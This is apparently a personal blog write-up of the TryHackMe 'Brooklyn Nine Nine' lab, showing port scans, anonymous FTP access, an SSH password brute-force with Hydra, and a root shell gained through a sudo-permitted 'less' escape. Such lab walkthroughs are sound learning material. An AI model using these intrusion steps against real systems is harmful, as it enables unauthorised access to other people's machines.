---
title: Brooklyn Nine Nine Writeup | TryHackMe
date: 2022-07-20 00:00:00 +/-TTTT
categories: [Writeup, TryHackMe]
tags: [writeup, tryhackme, gobuster, nmap, pentest]
author:
  name: v3r4x
---

## Overview

Welcome to my write-up for the [Anonymous room](https://tryhackme.com/room/anonymous) on [TryHackMe](https://tryhackme.com).  Unlike other rooms, this has very little hand-holding, so you must have a good knowledge base and methodology before attempting this room.  However, the room is of easy difficulty, so anyone can attempt to hack this box.  In preparation, I recommend you consult my other write-ups on [Kenobi](/assets/posts/20220720/posts/kenobi-writeup-tryhackme/) and [Mr Robot](/assets/posts/20220720/posts/mr-robot-tryhackme-writeup/).

In order to complete this room, we must enumerate the target machine's FTP server and website, bruteforce SSH credentials using Hydra in order to gain initial access, and escalate our privileges via misconfigured binaries.

I hope you enjoy!

## Walkthrough

Once we have established our connection to the VM, we begin by enumerating the machine by running an nmap scan:

```console
$ nmap -sC -sV -T4 -p- 10.10.240.107 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-20 22:26 BST
Nmap scan report for 10.10.240.107
Host is up (0.070s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.1.103
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.06 seconds
```

Here is a quick overview of the above scan:
- `-sC`: Will perform a script scan using a set of default scripts.
- `-sV`: Will probe open ports to determine service and version information.
- `-T4`: Sets the timing for the scan (higher is faster).
- `-p-`: Specifies all ports will be scanned (1-65535).

From the output, it shows we have **3 ports** open on the target machine, namely **FTP (21)**, **SSH (22)**, and **HTTP (80)**.

It also appears that anonymous access is enabled on the FTP service on port 21, so we can login:

![](/assets/posts/20220720/ftp_anonymous.png)

As highlighted, there is a `note_to_jake.txt` which reads:

```
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

Now that the FTP server has been enumerated, we can move onto the webserver.

![](/assets/posts/20220720/homepage.png)

It is good practice to manually crawl the website while you run additional scans.  In particular, we can run `nikto` to scan the website for vulnerabilities, and `gobuster` to check for additional subdirectories, while we check the website in our browser.  The output of such scans are as follows:

```console
$ nikto -h http://10.10.240.107
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.240.107
+ Target Hostname:    10.10.240.107
+ Target Port:        80
+ Start Time:         2022-07-20 22:44:40 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Server may leak inodes via ETags, header found with file /, inode: 2ce, size: 5a5ee14bb8d76, mtime: gzip
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7889 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2022-07-20 22:51:12 (GMT1) (392 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

```console
$ gobuster dir -u http://10.10.240.107 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobuster 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.240.107
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/07/20 22:42:33 Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 278]
Progress: 220512 / 220561 (99.98%)            ===============================================================
2022/07/20 23:00:01 Finished
===============================================================
```

Viewing the source code of the homepage reveals the following comment:

![](/assets/posts/20220720/source_code.png)

We can see if there is any data hidden within the image using steghide:

```console
$ wget http://10.10.240.107/brooklyn99.jpg

$ steghide info brooklyn99.jpg
"brooklyn99.jpg":
  format: jpeg
  capacity: 3.5 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase:
```

It appears that there is a `.jpeg` file embedded within the image, but it requires a passphrase in order to be extracted.

From the `note_to_jake.txt` file on the FTP server, it appears Jake's password is particularly weak.  Therefore, we can `hydra` to bruteforce his password on the SSH server:

![](/assets/posts/20220720/hydra.png)

With the password, we are now able to login as the `jake` user via SSH, but we still cannot crack the passphrase for the image.

![](/assets/posts/20220720/jake_ssh.png)

However, there is no `user.txt` within the `jake` user's `/home` directory.  Listing the contents of the `/home` directory, there appears to be two other users: `amy` and `holt`.  The `user.txt` flag is contained within the `holt` user's `/home` directory:

![](/assets/posts/20220720/user_flag.png)

Now that we have the `user.txt` flag we find a way to escalate our privileges to `root`.  Firstly, we can check if we can run any binaries with `sudo` using the `sudo -l` command:

```console
jake@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```

As shown, we can run the `less` binary with `sudo` without any password, meaning we can elevate our privileges to `root`.  To do this, we can consult [GTFObins](https://gtfobins.github.io/gtfobins/less/#sudo) for the `less` binary.  In particular, we can run the following as `jake` in order to become `root` and retrieve the `root.txt` flag:

```
sudo less /etc/profile
!/bin/sh
```

![](/assets/posts/20220720/root_flag.png)

## Closing Remarks

And that's it!  All done!

I hope you all enjoyed this room and learned a thing or two.  I really am trying to up my game with these writeups and tutorials for my own learning and so I can share my knowledge with you.

If you want to keep up-to-date on what I do, follow me here:

- [Twitter](https://twitter.com/0xV3R4X)
- [GitHub](https://github.com/0xv3r4x)

Or you can also support me by buying me a coffee:

<a href="https://www.buymeacoffee.com/v3r4x" target="_blank"><img src="https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png" alt="Buy Me A Coffee" style="height: auto !important; width: auto !important;"></a>

Stay curious

\- v3r4x